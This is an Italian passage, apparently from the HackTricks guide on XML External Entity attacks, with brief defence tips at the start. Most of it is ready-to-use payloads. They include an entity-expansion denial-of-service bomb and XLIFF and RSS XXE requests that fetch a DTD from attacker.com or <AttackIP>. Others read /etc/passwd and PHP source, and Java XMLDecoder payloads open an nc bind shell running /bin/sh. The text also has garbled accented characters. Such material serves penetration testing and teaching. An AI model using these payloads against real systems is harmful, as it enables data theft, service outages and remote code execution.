Per difendersi dag, √® possibile adottare le seguenti misure:

- Disabilitare la risoluzione delle entit√† esterne nell'elaborazione XML.
- Validare e filtrare i dati di input XML per impedire l'inserimento di entit√† esterne dannose.
- Utilizzare parser XML sicuri che non risolvono entit√† esterne per impostazione predefinita.

---

### **XML Entity Expansion (XEE) Attack**

Un attacco di espansione delle entit√† XML (XEE) sfrutta la capacit√† di alcuni parser XML di espandere entit√† in modo ricorsivo, portando a un consumo eccessivo di risorse del server. Gli attaccanti possono utilizzare questa tecnica per eseguire attacchi di denial of service (DoS) contro il server bersaglio.

#### **Come funziona l'attacco XEE?**

Durante un attacco XEE, un attaccante inserisce entit√† XML ricorsive in un documento XML. Quando il parser XML elabora il documento, le entit√† vengono espandere in modo ricorsivo, consumando risorse del server e causando un'interruzione del servizio.

#### **Esempio di payload XEE**

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol1;</lolz>
```

Nell'esempio sopra, il payload XEE espande l'entit√† `lol1` in modo ricorsivo, causando un consumo eccessivo di risorse.

#### **Come difendersi dagli attacchi XEE?**

Per difendersi dagli attacchi XEE, √® consigliabile:

- Limitare il numero di entit√† espandibili nei documenti XML.
- Monitorare e limitare le risorse utilizzate durante l'elaborazione XML.
- Utilizzare parser XML che limitano l'espansione delle entit√† per prevenire attacchi di espansione delle entit√†.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Questo esempio √® ispirato a [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) viene utilizzato per standardizzare lo scambio di dati nei processi di localizzazione. √à un formato basato su XML utilizzato principalmente per trasferire dati localizzabili tra strumenti durante la localizzazione e come formato di scambio comune per gli strumenti CAT (Computer-Aided Translation).

### Analisi della Richiesta Blind

Viene effettuata una richiesta al server con il seguente contenuto:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Tuttavia, questa richiesta attiva un errore interno del server, menzionando specificamente un problema con le dichiarazioni di markup:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Nonostante l'errore, viene registrato un hit su Burp Collaborator, indicando un certo livello di interazione con l'entit√† esterna.

Esfiltrazione di Dati Out of Band Per esfiltrare i dati, viene inviata una richiesta modificata:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Questo approccio rivela che l'User Agent indica l'uso di Java 1.8. Una limitazione nota di questa versione di Java √® l'incapacit√† di recuperare file contenenti un carattere di nuova riga, come ad esempio /etc/passwd, utilizzando la tecnica Out of Band.

Esfiltrazione di Dati Basata su Errori Per superare questa limitazione, viene utilizzato un approccio basato sugli errori. Il file DTD √® strutturato come segue per innescare un errore che include dati da un file di destinazione:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Il server risponde con un errore, riflettendo in modo importante il file inesistente, indicando che il server sta cercando di accedere al file specificato:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Per includere il contenuto del file nel messaggio di errore, il file DTD viene modificato:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Questa modifica porta all'esfiltrazione riuscita del contenuto del file, come risulta dall'output di errore inviato tramite HTTP. Ci√≤ indica un attacco XXE (XML External Entity) riuscito, sfruttando sia tecniche Out of Band che Error-Based per estrarre informazioni sensibili.

## RSS - XEE

XML valido con formato RSS per sfruttare una vulnerabilit√† XXE.

### Ping back

Richiesta HTTP semplice al server degli attaccanti
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leggere file
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leggere il codice sorgente

Utilizzando il filtro base64 di PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder √® una classe Java che crea oggetti basati su un messaggio XML. Se un utente malintenzionato riesce a far s√¨ che un'applicazione utilizzi dati arbitrari in una chiamata al metodo **readObject**, otterr√† immediatamente l'esecuzione del codice sul server.

### Utilizzando Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Strumenti

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Riferimenti

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Estrarre informazioni tramite HTTP utilizzando il proprio DTD esterno: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
